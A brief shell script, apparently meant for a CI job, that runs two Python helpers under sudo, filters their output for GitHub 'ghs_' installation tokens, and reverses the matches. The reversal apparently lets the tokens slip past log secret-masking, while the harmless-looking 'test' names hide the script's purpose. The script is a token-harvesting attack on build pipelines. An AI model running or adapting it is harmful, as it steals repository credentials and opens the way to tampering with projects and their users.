echo test
sudo python3 test.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
sudo python3 test2.py | tr -d '\\0' | grep -aoE 'ghs_[0-9A-Za-z]{20,}' | sort -u | rev
sleep 60
exit 0